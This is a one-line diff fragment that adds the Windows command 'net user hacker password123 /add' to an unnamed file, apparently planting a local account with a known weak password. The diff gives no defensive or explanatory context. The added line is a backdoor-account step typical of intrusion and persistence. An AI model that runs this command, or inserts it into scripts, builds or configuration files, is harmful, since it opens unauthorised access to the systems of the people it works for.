@@ -1,0 +1,1 @@
+net user hacker password123 /add
